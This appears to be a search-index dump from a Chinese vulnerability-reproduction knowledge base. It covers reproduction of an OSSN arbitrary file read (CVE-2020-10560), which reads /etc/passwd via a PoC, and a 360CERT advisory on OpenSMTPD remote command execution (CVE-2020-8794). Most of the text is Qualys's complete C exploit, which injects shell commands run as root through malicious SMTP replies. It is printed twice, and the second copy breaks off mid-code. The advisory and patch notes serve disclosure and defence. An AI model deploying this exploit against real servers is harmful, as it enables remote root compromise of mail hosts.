6.\u8fdb\u884c\u7f51\u7ad9\u8bbe\u7f6e\uff0c\u9700\u8981\u586b\u5199\u6570\u636e\u5e93\u4fe1\u606f\u548c\u7f51\u7ad9\u4fe1\u606f\uff08\u7f51\u7ad9\u540d\u79f0\u548c\u90ae\u7bb1\u53ef\u4ee5\u968f\u4fbf\u586b\u5199\uff09\uff0c\u70b9\u51fb\u4e0b\u4e00\u6b65\u3002 \u6ce8\u610f\uff1a\u8fd9\u91cc\u7684\u6570\u636e\u5e93\u4fe1\u606f\u586b\u5199\u5982\u4e0b\uff1a DB: ossn username: ossn password: ossn host: mysqlserver 12345 7.\u521b\u5efa\u7ba1\u7406\u8d26\u6237\uff0c\u6309\u8981\u6c42\u586b\u5199\u5373\u53ef\u3002 8.\u73af\u5883\u642d\u5efa\u5b8c\u6210\u3002","title":"\u3010\u73af\u5883\u642d\u5efa\u3011"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_3","text":"","title":"\u3010\u9a8c\u8bc1\u8be6\u60c5\u3011"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_4","text":"\u9996\u5148\u9700\u8981\u83b7\u53d6site_key\u7684\u503c\uff0c\u5728\u5b9e\u9645\u73af\u5883\u4e2d\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u7206\u7834\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\uff0csite_key\u7206\u7834\u811a\u672c\u53c2\u8003\u94fe\u63a5\uff1a https://github.com/LucidUnicorn/CVE-2020-10560-Key-Recovery/releases \u56e0\u4e3a\u8fd9\u91cc\u6211\u4eec\u662f\u5728\u672c\u5730\u4f7f\u7528docker\u642d\u5efa\u7684\u590d\u73b0\u73af\u5883\uff0c\u6211\u4eec\u76f4\u63a5\u53d6\u6570\u636e\u5e93\u67e5\u8be2site_key\u503c\u5373\u53ef\u3002 1.\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u6709\u4e00\u4e2amysql\u7684\u4e3b\u673a\uff0c\u4f7f\u7528mysql\u7528\u6237\u540d\u548c\u5bc6\u7801\u8fde\u63a5\u6570\u636e\u5e93\uff08ossn/ossn\uff09\u3002 2.\u67e5\u8be2\u6570\u636e\u5e93\u4e2d\u7684\u8868ossn_ site_settings\uff0c\u627e\u5230site_key\u7684\u503c\u3002","title":"\u9a8c\u8bc1\u6761\u4ef6"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_5","text":"1.\u590d\u5236\u521a\u624d\u6211\u4eec\u4ecegithub\u4e0a\u4e0b\u8f7d\u7684poc\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\u3002 2.\u7136\u540e\u4f7f\u7528python3\u6267\u884c\u811a\u672c\uff0c\u4f9d\u6b21\u586b\u5199site_key\uff0c\u8bfb\u53d6\u7684\u6587\u4ef6\uff0c\u76ee\u6807\u7f51\u7ad9\u5730\u5740\uff0c\u53ef\u4ee5\u770b\u5230\u6210\u529f\u8bfb\u53d6\u5230\u4e86\u76ee\u6807\u7cfb\u7edf\u7684passwd\u6587\u4ef6\u5185\u5bb9\u3002","title":"\u9a8c\u8bc1\u8fc7\u7a0b"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_6","text":"\u76ee\u524d\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u6f0f\u6d1e\uff0c\u8be6\u60c5\u8bf7\u5173\u6ce8\u5382\u5546\u4e3b\u9875\uff1a https://www.opensource-socialnetwork.org/","title":"\u3010\u9632\u5fa1\u65b9\u5f0f\u3011"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OSSN/OSSN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-10560%EF%BC%89/#_7","text":"https://techanarchy.net/blog/cve-2020-10560-ossn-arbitrary-file-read","title":"\u3010\u53c2\u8003\u8d44\u6599\u3011"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"CVE-2020-8794: OpenSMTPD \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u901a\u544a \u00b6 0x00 \u6f0f\u6d1e\u80cc\u666f \u00b6 2020\u5e7403\u670802\u65e5\uff0c 360CERT\u76d1\u6d4b\u53d1\u73b0\u56fd\u5916 qualys \u7814\u7a76\u56e2\u961f\u5df2\u7ecf\u516c\u5e03 OpenSMTPD \u7684\u4e00\u679a\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u7684\u6f0f\u6d1e\u7ec6\u8282\uff0c\u6f0f\u6d1e\u7f16\u53f7\u4e3a CVE-2020-8794 \uff0c\u5f71\u54cd 6.6.4 \u53ca\u4e4b\u524d\u7684\u7248\u672c\u3002 \u8be5\u6f0f\u6d1e\u662f\u4e00\u4e2a\u8d8a\u754c\u8bfb\u6f0f\u6d1e\uff0c\u5728 2015\u5e7412\u6708\u88ab\u5f15\u5165 (commit id 80c6a60c )\u3002 \u4e0e\u4e0a\u4e00\u4e2a\u6f0f\u6d1e CVE-2020-7247 \u76f8\u6bd4\uff0c CVE-2020-8794 \u4ea7\u751f\u4e86\u66f4\u4e3a\u5e7f\u6cdb\u7684\u5f71\u54cd\u7248\u672c\uff0c\u653b\u51fb\u65b9\u5f0f\u66f4\u4e3a\u590d\u6742\u3002 \u8be5\u6f0f\u6d1e\u5728\u9ed8\u8ba4\u5b89\u88c5 OpenSMTPD \u60c5\u51b5\u4e0b\uff0c\u5373\u53ef\u653b\u51fb\u6210\u529f\u5e76\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002 0x01 \u98ce\u9669\u7b49\u7ea7 \u00b6 360CERT\u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u884c\u8bc4\u5b9a \u8bc4\u5b9a\u65b9\u5f0f \u7b49\u7ea7 \u5a01\u80c1\u7b49\u7ea7 \u9ad8\u5371 \u5f71\u54cd\u9762 \u4e00\u822c 360CERT\u5efa\u8bae\u5e7f\u5927\u7528\u6237\u53ca\u65f6\u66f4\u65b0 OpenSMTPD \u3002\u505a\u597d\u8d44\u4ea7 \u81ea\u67e5/\u81ea\u68c0/\u9884\u9632 \u5de5\u4f5c\uff0c\u4ee5\u514d\u906d\u53d7\u653b\u51fb\u3002 0x02 \u5f71\u54cd\u7248\u672c \u00b6 OpenSMTPD <= 6.6.4 0x03 \u4fee\u590d\u5efa\u8bae \u00b6 \u6700\u65b0\u7248\u672c\u4e3a 6.6.4p1 \u3002 Debain \u7528\u6237\u53ef\u4ee5\u901a\u8fc7 apt \u5305\u7ba1\u7406\u5668\u5347\u7ea7 OpenSMTPD stretch 6.0.2p1-2+deb9u3 buster 6.0.3p1-5+deb10u4 0x4 \u6f0f\u6d1e\u5229\u7528EXP\uff1a \u00b6 /* * LPE and RCE in OpenSMTPD's default install (CVE-2020-8794) * Copyright (C) 2020 Qualys, Inc. * * This program is free software: you can redistribute it and/or modify * it under the terms of the GNU General Public License as published by * the Free Software Foundation, either version 3 of the License, or * (at your option) any later version. * * This program is distributed in the hope that it will be useful, * but WITHOUT ANY WARRANTY; without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the * GNU General Public License for more details. * * You should have received a copy of the GNU General Public License * along with this program. If not, see <https://www.gnu.org/licenses/>. */ #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <netinet/tcp.h> #include <netdb.h> #include <stdarg.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <time.h> #include <unistd.h> static enum { CLIENT_SIDE_EXPLOIT , SERVER_SIDE_EXPLOIT , } exploit = CLIENT_SIDE_EXPLOIT ; static enum { NEW_SMTPD_GRAMMAR , OLD_SMTPD_GRAMMAR , } grammar = NEW_SMTPD_GRAMMAR ; static struct { const char * command ; const char * user ; const char * dispatcher ; const char * maildir ; char lines [ 512 ]; } inject = { . command = \"X=`mktemp /tmp/x.XXXXXX`&&id>>$X;exit 0\" , . user = \"root\" , . dispatcher = \"local_mail\" , . maildir = NULL , }; #define die() do { \\ printf(\"died in %s: %u\\n\", __func__, __LINE__); \\ exit(EXIT_FAILURE); \\ } while (0) static struct addrinfo * common_getaddrinfo ( const char * const host , const char * const port ) { const struct addrinfo hints = { . ai_family = AF_INET , . ai_socktype = SOCK_STREAM , . ai_protocol = IPPROTO_TCP , . ai_flags = AI_NUMERICHOST | AI_NUMERICSERV , }; struct addrinfo * addr = NULL ; if ( getaddrinfo ( host , port , & hints , & addr ) != 0 ) die (); if ( addr == NULL || addr -> ai_next != NULL ) die (); return addr ; } static const char * common_getnameinfo ( const struct sockaddr * const addr , const socklen_t addr_len ) { static char host [ NI_MAXHOST ]; static char port [ NI_MAXSERV ]; if ( getnameinfo ( addr , addr_len , host , sizeof ( host ), port , sizeof ( port ), NI_NUMERICHOST | NI_NUMERICSERV ) != 0 ) die (); static char host_port [ NI_MAXHOST + NI_MAXSERV ]; if ( snprintf ( host_port , sizeof ( host_port ), \"%s:%s\" , host , port ) <= 0 ) die (); return host_port ; } static void common_send ( const int fd , const char * const format , va_list ap ) { if ( fd <= -1 ) die (); static char buf [ 1024 ]; const int len = vsnprintf ( buf , sizeof ( buf ), format , ap ); if ( len <= 0 || ( unsigned ) len >= sizeof ( buf )) die (); printf ( \"--> %s%s\" , buf , buf [ len -1 ] != '\\n' ? \" \\n \" : \"\" ); const char * data = buf ; size_t size = len ; for (;;) { const ssize_t sent = send ( fd , data , size , MSG_NOSIGNAL ); if ( sent <= 0 ) die (); if (( size_t ) sent > size ) die (); data += sent ; size -= sent ; if ( size <= 0 ) return ; } die (); } static int listen_fd = -1 ; static void server_listen ( void ) { if ( listen_fd != -1 ) die (); const struct addrinfo * const addr = common_getaddrinfo ( \"0.0.0.0\" , \"25\" ); listen_fd = socket ( addr -> ai_family , addr -> ai_socktype , addr -> ai_protocol ); if ( listen_fd <= -1 ) die (); const int on = 1 ; if ( setsockopt ( listen_fd , SOL_SOCKET , SO_REUSEADDR , & on , sizeof ( on )) != 0 ) die (); if ( bind ( listen_fd , addr -> ai_addr , addr -> ai_addrlen ) != 0 ) die (); if ( listen ( listen_fd , 10 ) != 0 ) die (); printf ( \" \\n Listening on %s \\n \" , common_getnameinfo ( addr -> ai_addr , addr -> ai_addrlen )); } static int server_fd = -1 ; static void server_accept ( void ) { struct sockaddr addr ; socklen_t addr_len = sizeof ( addr ); if ( listen_fd <= -1 ) die (); if ( server_fd != -1 ) die (); server_fd = accept ( listen_fd , & addr , & addr_len ); if ( server_fd <= -1 ) die (); if ( addr_len > sizeof ( addr )) die (); const time_t now = time ( NULL ); printf ( \" \\n Connection from %s \\n %s\" , common_getnameinfo ( & addr , addr_len ), ctime ( & now )); const int on = 1 ; if ( setsockopt ( server_fd , IPPROTO_TCP , TCP_NODELAY , & on , sizeof ( on )) != 0 ) die (); } static void server_send ( const char * const format , ...) { if ( server_fd <= -1 ) die (); va_list ap ; va_start ( ap , format ); common_send ( server_fd , format , ap ); va_end ( ap ); } static char server_command [ 1024 ]; static void server_recv ( const char * const prefix ) { if ( server_fd <= -1 ) die (); const size_t prefix_len = strlen ( prefix ); if ( prefix_len < 4 ) die (); char * data = server_command ; size_t size = sizeof ( server_command ); for (;;) { const ssize_t rcvd = recv ( server_fd , data , size , 0 ); if ( rcvd <= 0 ) die (); if (( size_t ) rcvd >= size ) die (); data += rcvd ; size -= rcvd ; data [ 0 ] = '\\0' ; if ( data [ -1 ] != '\\n' ) continue ; if ( strchr ( server_command , '\\n' ) != data - 1 ) die (); printf ( \"<-- %s\" , server_command ); if ( strncmp ( server_command , prefix , prefix_len ) != 0 ) die (); return ; } die (); } static void server_close ( void ) { if ( server_fd <= -1 ) die (); if ( close ( server_fd ) != 0 ) die (); server_fd = -1 ; } static void server_session ( const char * const inject_lines ) { const char * const error_code = ( exploit == SERVER_SIDE_EXPLOIT ) ? \"421\" : \"553\" ; server_accept (); server_send ( \"220 ent.of.line ESMTP \\n \" ); server_recv ( \"EHLO \" ); server_send ( \"250 ent.of.line Hello \\n \" ); server_recv ( \"MAIL FROM:<\" ); if (( strncmp ( server_command , \"MAIL FROM:<>\" , 12 ) == 0 ) != ( exploit == SERVER_SIDE_EXPLOIT )) die (); if ( inject_lines != NULL ) { if ( inject_lines [ 0 ] == '\\0' ) die (); if ( inject_lines [ 0 ] == '\\n' ) die (); if ( inject_lines [ strlen ( inject_lines ) -1 ] == '\\n' ) die (); server_send ( \"%s-Error \\n \" , error_code ); server_send ( \"%s \\n\\n %s%c\" , error_code , inject_lines , ( int ) '\\0' ); } else { server_send ( \"%s Error \\n \" , error_code ); server_recv ( \"RSET\" ); server_send ( \"250 Reset \\n \" ); server_recv ( \"QUIT\" ); server_send ( \"221 Bye \\n \" ); } server_close (); } static const struct addrinfo * client_target = NULL ; static const char * client_mail = NULL ; static const char * client_rcpt = NULL ; static int client_fd = -1 ; static void client_connect ( void ) { if ( client_fd != -1 ) die (); client_fd = socket ( client_target -> ai_family , client_target -> ai_socktype , client_target -> ai_protocol ); if ( client_fd <= -1 ) die (); if ( connect ( client_fd , client_target -> ai_addr , client_target -> ai_addrlen ) != 0 ) die (); printf ( \" \\n Connected to %s \\n \" , common_getnameinfo ( client_target -> ai_addr , client_target -> ai_addrlen )); } static void client_send ( const char * const format , ...) { if ( client_fd <= -1 ) die (); va_list ap ; va_start ( ap , format ); common_send ( client_fd , format , ap ); va_end ( ap ); } static char client_reply [ 1024 ]; static void client_recv ( const char * const prefix ) { if ( client_fd <= -1 ) die (); const size_t prefix_len = strlen ( prefix ); if ( prefix_len < 3 ) die (); char * data = client_reply ; size_t size = sizeof ( client_reply ); const char * line = data ; for (;;) { const ssize_t rcvd = recv ( client_fd , data , size , 0 ); if ( rcvd <= 0 ) die (); if (( size_t ) rcvd >= size ) die (); data += rcvd ; size -= rcvd ; data [ 0 ] = '\\0' ; if ( data [ -1 ] != '\\n' ) continue ; for (;;) { const char * const new_line = strchr ( line , '\\n' ); if ( new_line == NULL ) break ; if ( new_line - line < 4 ) die (); printf ( \"<-- %.*s\" , ( int )( new_line - line + 1 ), line ); if ( strncmp ( line , prefix , prefix_len ) != 0 ) die (); if ( line [ 3 ] == ' ' ) { if ( new_line + 1 != data ) die (); return ; } if ( line [ 3 ] != '-' ) die (); line = new_line + 1 ; } if ( line != data ) die (); } die (); } static void client_close ( void ) { if ( client_fd <= -1 ) die (); if ( close ( client_fd ) != 0 ) die (); client_fd = -1 ; } static void client_session ( void ) { client_connect (); client_recv ( \"220 \" ); client_send ( \"HELP \\n \" ); client_recv ( \"214\" ); if ( strstr ( client_reply , \"please contact bugs@openbsd.org\" ) == NULL ) die (); client_send ( \"EHLO ent.of.line \\n \" ); client_recv ( \"250\" ); const int dsn = ( strstr ( client_reply , \"250-DSN\" ) != NULL ); client_send ( \"MAIL FROM:<%s> \\n \" , client_mail ); client_recv ( \"250 \" ); client_send ( \"RCPT TO:<%s>%s \\n \" , client_rcpt , dsn ? \" NOTIFY=SUCCESS\" : \"\" ); client_recv ( \"250 \" ); client_send ( \"DATA \\n \" ); client_recv ( \"354 Enter mail, end with \" ); if ( ! dsn ) { client_send ( \"Delivered-To: %s \\n \" , client_rcpt ); } client_send ( \" \\n \" ); client_send ( \". \\n \" ); client_recv ( \"250 \" ); client_send ( \"QUIT \\n \" ); client_recv ( \"221 \" ); client_close (); } int main ( int argc , char * const * argv ) { setlinebuf ( stdout ); puts ( \"LPE and RCE in OpenSMTPD's default install (CVE-2020-8794)\" ); puts ( \"Copyright (C) 2020 Qualys, Inc.\" ); int opt ; while (( opt = getopt ( argc , argv , \"c:u:d:m:n\" )) != -1 ) { switch ( opt ) { case 'c' : inject . command = optarg ; break ; case 'u' : grammar = OLD_SMTPD_GRAMMAR ; inject . user = optarg ; break ; case 'd' : inject . dispatcher = optarg ; break ; case 'm' : grammar = OLD_SMTPD_GRAMMAR ; inject . maildir = optarg ; break ; case 'n' : grammar = NEW_SMTPD_GRAMMAR ; break ; default : die (); } } if ( grammar == NEW_SMTPD_GRAMMAR ) { const int len = snprintf ( inject . lines , sizeof ( inject . lines ), \"type:mda \\n mda-exec:%s \\n dispatcher:%s \\n mda-user:%s\" , inject . command , inject . dispatcher , inject . user ); if ( len <= 0 || ( unsigned ) len >= sizeof ( inject . lines )) die (); } else if ( grammar == OLD_SMTPD_GRAMMAR ) { const int len = snprintf ( inject . lines , sizeof ( inject . lines ), \"type:mda \\n mda-buffer:%s \\n mda-method:%s \\n mda-user:%s \\n mda-usertable:<getpwnam>\" , inject . maildir ? inject . maildir : inject . command , inject . maildir ? \"maildir\" : \"mda\" , inject . user ); if ( len <= 0 || ( unsigned ) len >= sizeof ( inject . lines )) die (); } else die (); argc -= optind ; argv += optind ; if ( argc == 3 ) { exploit = SERVER_SIDE_EXPLOIT ; client_target = common_getaddrinfo ( argv [ 0 ], \"25\" ); client_mail = argv [ 1 ]; client_rcpt = argv [ 2 ]; } else if ( argc != 0 ) die (); server_listen (); if ( exploit == CLIENT_SIDE_EXPLOIT ) { server_session ( inject . lines ); } else if ( exploit == SERVER_SIDE_EXPLOIT ) { client_session (); unsigned try ; for ( try = 0 ; try < 1 ; try ++ ) { server_session ( NULL ); puts ( \" \\n Please wait for OpenSMTPD to connect back...\" ); } server_session ( inject . lines ); client_session (); server_session ( \"type:invalid\" ); } else die (); exit ( EXIT_SUCCESS ); } \u6ce8\uff1aEXP\u6765\u6e90\u4e8e\uff1a https://www.exploit-db.com/exploits/48140 0x05 \u53c2\u8003\u94fe\u63a5 \u00b6 1\u3001qualys \u62a5\u544a [ https://www.qualys.com/2020/02/24/cve-2020-8794/lpe-rce-opensmtpd-default-install.txt ] 2\u3001qualys \u62a5\u544a\u7ec6\u8282 [ https://www.qualys.com/2020/02/24/cve-2020-8794/lpe-rce-opensmtpd-default-install-exploit.c ] 3\u3001CVE-2020-7247: OpenSMTPD \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u901a\u544a - 360CERT [ https://cert.360.cn/warning/detail?id=b03e92c903678dd6497d1be040f761d5 ] 4\u3001Releases \u00b7 OpenSMTPD/OpenSMTPD [ https://github.com/OpenSMTPD/OpenSMTPD/releases ] 5\u3001Debian -- Security Information -- DSA-4634-1 opensmtpd [ https://www.debian.org/security/2020/dsa-4634 ]","title":"CVE 2020 8794 OpenSMTPD \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#cve-2020-8794-opensmtpd","text":"","title":"CVE-2020-8794: OpenSMTPD \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u901a\u544a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x00","text":"2020\u5e7403\u670802\u65e5\uff0c 360CERT\u76d1\u6d4b\u53d1\u73b0\u56fd\u5916 qualys \u7814\u7a76\u56e2\u961f\u5df2\u7ecf\u516c\u5e03 OpenSMTPD \u7684\u4e00\u679a\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u7684\u6f0f\u6d1e\u7ec6\u8282\uff0c\u6f0f\u6d1e\u7f16\u53f7\u4e3a CVE-2020-8794 \uff0c\u5f71\u54cd 6.6.4 \u53ca\u4e4b\u524d\u7684\u7248\u672c\u3002 \u8be5\u6f0f\u6d1e\u662f\u4e00\u4e2a\u8d8a\u754c\u8bfb\u6f0f\u6d1e\uff0c\u5728 2015\u5e7412\u6708\u88ab\u5f15\u5165 (commit id 80c6a60c )\u3002 \u4e0e\u4e0a\u4e00\u4e2a\u6f0f\u6d1e CVE-2020-7247 \u76f8\u6bd4\uff0c CVE-2020-8794 \u4ea7\u751f\u4e86\u66f4\u4e3a\u5e7f\u6cdb\u7684\u5f71\u54cd\u7248\u672c\uff0c\u653b\u51fb\u65b9\u5f0f\u66f4\u4e3a\u590d\u6742\u3002 \u8be5\u6f0f\u6d1e\u5728\u9ed8\u8ba4\u5b89\u88c5 OpenSMTPD \u60c5\u51b5\u4e0b\uff0c\u5373\u53ef\u653b\u51fb\u6210\u529f\u5e76\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002","title":"0x00 \u6f0f\u6d1e\u80cc\u666f"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x01","text":"360CERT\u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u884c\u8bc4\u5b9a \u8bc4\u5b9a\u65b9\u5f0f \u7b49\u7ea7 \u5a01\u80c1\u7b49\u7ea7 \u9ad8\u5371 \u5f71\u54cd\u9762 \u4e00\u822c 360CERT\u5efa\u8bae\u5e7f\u5927\u7528\u6237\u53ca\u65f6\u66f4\u65b0 OpenSMTPD \u3002\u505a\u597d\u8d44\u4ea7 \u81ea\u67e5/\u81ea\u68c0/\u9884\u9632 \u5de5\u4f5c\uff0c\u4ee5\u514d\u906d\u53d7\u653b\u51fb\u3002","title":"0x01 \u98ce\u9669\u7b49\u7ea7"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x02","text":"OpenSMTPD <= 6.6.4","title":"0x02 \u5f71\u54cd\u7248\u672c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x03","text":"\u6700\u65b0\u7248\u672c\u4e3a 6.6.4p1 \u3002 Debain \u7528\u6237\u53ef\u4ee5\u901a\u8fc7 apt \u5305\u7ba1\u7406\u5668\u5347\u7ea7 OpenSMTPD stretch 6.0.2p1-2+deb9u3 buster 6.0.3p1-5+deb10u4","title":"0x03 \u4fee\u590d\u5efa\u8bae"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/OpenSMTP/CVE-2020-8794-OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x4-exp","text":"/* * LPE and RCE in OpenSMTPD's default install (CVE-2020-8794) * Copyright (C) 2020 Qualys, Inc. * * This program is free software: you can redistribute it and/or modify * it under the terms of the GNU General Public License as published by * the Free Software Foundation, either version 3 of the License, or * (at your option) any later version. * * This program is distributed in the hope that it will be useful, * but WITHOUT ANY WARRANTY; without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the * GNU General Public License for more details. * * You should have received a copy of the GNU General Public License * along with this program. If not, see <https://www.gnu.org/licenses/>. */ #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <netinet/tcp.h> #include <netdb.h> #include <stdarg.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <time.h> #include <unistd.h> static enum { CLIENT_SIDE_EXPLOIT , SERVER_SIDE_EXPLOIT , } exploit = CLIENT_SIDE_EXPLOIT ; static enum { NEW_SMTPD_GRAMMAR , OLD_SMTPD_GRAMMAR , } grammar = NEW_SMTPD_GRAMMAR ; static struct { const char * command ; const char * user ; const char * dispatcher ; const char * maildir ; char lines [ 512 ]; } inject = { . command = \"X=`mktemp /tmp/x.XXXXXX`&&id>>$X;exit 0\" , . user = \"root\" , . dispatcher = \"local_mail\" , . maildir = NULL , }; #define die() do { \\ printf(\"died in %s: %u\\n\", __func__, __LINE__); \\ exit(EXIT_FAILURE); \\ } while (0) static struct addrinfo * common_getaddrinfo ( const char * const host , const char * const port ) { const struct addrinfo hints = { . ai_family = AF_INET , . ai_socktype = SOCK_STREAM , . ai_protocol = IPPROTO_TCP , . ai_flags = AI_NUMERICHOST | AI_NUMERICSERV , }; struct addrinfo * addr = NULL ; if ( getaddrinfo ( host , port , & hints , & addr ) != 0 ) die (); if ( addr == NULL || addr -> ai_next != NULL ) die (); return addr ; } static const char * common_getnameinfo ( const struct sockaddr * const addr , const socklen_t addr_len ) { static char host [ NI_MAXHOST ]; static char port [ NI_MAXSERV ]; if ( getnameinfo ( addr , addr_len , host , sizeof ( host ), port , sizeof ( port ), NI_NUMERICHOST | NI_NUMERICSERV ) != 0 ) die (); static char host_port [ NI_MAXHOST + NI_MAXSERV ]; if ( snprintf ( host_port , sizeof ( host_port ), \"%s:%s\" , host , port ) <= 0 ) die (); return host_port ; } static void common_send ( const int fd , const char * const format , va_list ap ) { if ( fd <= -1 ) die (); static char buf [ 1024 ]; const int len = vsnprintf ( buf , sizeof ( buf ), format , ap ); if ( len <= 0 || ( unsigned ) len >= sizeof ( buf )) die (); printf ( \"--> %s%s\" , buf , buf [ len -1 ] != '\\n' ? \" \\n \" : \"\" ); const char * data = buf ; size_t size = len ; for (;;) { const ssize_t sent = send ( fd , data , size , MSG_NOSIGNAL ); if ( sent <= 0 ) die (); if (( size_t ) sent > size ) die (); data += sent ; size -= sent ; if ( size <= 0 ) return ; } die (); } static int listen_fd = -1 ; static void server_listen ( void ) { if ( listen_fd != -1 ) die (); const struct addrinfo * const addr = common_getaddrinfo ( \"0.0.0.0\" , \"25\" ); listen_fd = socket ( addr -> ai_family , addr -> ai_socktype , addr -> ai_protocol ); if ( listen_fd <= -1 ) die (); const int on = 1 ; if ( setsockopt ( listen_fd , SOL_SOCKET , SO_REUSEADDR , & on , sizeof ( on )) != 0 ) die (); if ( bind ( listen_fd , addr -> ai_addr , addr -> ai_addrlen ) != 0 ) die (); if ( listen ( listen_fd , 10 ) != 0 ) die (); printf ( \" \\n Listening on %s \\n \" , common_getnameinfo ( addr -> ai_addr , addr -> ai_addrlen )); } static int server_fd = -1 ; static void server_accept ( void ) { struct sockaddr addr ; socklen_t addr_len = sizeof ( addr ); if ( listen_fd <= -1 ) die (); if ( server_fd != -1 ) die (); server_fd = accept ( listen_fd , & addr , & addr_len ); if ( server_fd <= -1 ) die (); if ( addr_len > sizeof ( addr )) die (); const time_t now = time ( NULL ); printf ( \" \\n Connection from %s \\n %s\" , common_getnameinfo ( & addr , addr_len ), ctime ( & now )); const int on = 1 ; if ( setsockopt ( server_fd , IPPROTO_TCP , TCP_NODELAY , & on , sizeof ( on )) != 0 ) die (); } static void server_send ( const char * const format , ...) { if ( server_fd <= -1 ) die (); va_list ap ; va_start ( ap , format ); common_send ( server_fd , format , ap ); va_end ( ap ); } static char server_command [ 1024 ]; static void server_recv ( const char * const prefix ) { if ( server_fd <= -1 ) die (); const size_t prefix_len = strlen ( prefix ); if ( prefix_len < 4 ) die (); char * data = server_command ; size_t size = sizeof ( server_command ); for (;;) { const ssize_t rcvd = recv ( server_fd , data , size , 0 ); if ( rcvd <= 0 ) die (); if (( size_t ) rcvd >= size ) die (); data += rcvd ; size -= rcvd ; data [ 0 ] = '\\0' ; if ( data [ -1 ] != '\\n' ) continue ; if ( strchr ( server_command , '\\n' ) != data - 1 ) die (); printf ( \"<-- %s\" , server_command ); if ( strncmp ( server_command , prefix , prefix_len ) != 0 ) die (); return ; } die (); } static void server_close ( void ) { if ( server_fd <= -1 ) die (); if ( close ( server_fd ) != 0 ) die (); server_fd = -1 ; } static void server_session ( const char * const inject_lines ) { const char * const error_code = ( exploit == SERVER_SIDE_EXPLOIT ) ? \"421\" : \"553\" ; server_accept (); server_send ( \"220 ent.of.line ESMTP \\n \" ); server_recv ( \"EHLO \" ); server_send ( \"250 ent.of.line Hello \\n \" ); server_recv ( \"MAIL FROM:<\" ); if (( strncmp ( server_command , \"MAIL FROM:<>\" , 12 ) == 0 ) != ( exploit == SERVER_SIDE_EXPLOIT )) die (); if ( inject_lines != NULL ) { if ( inject_lines [ 0 ] 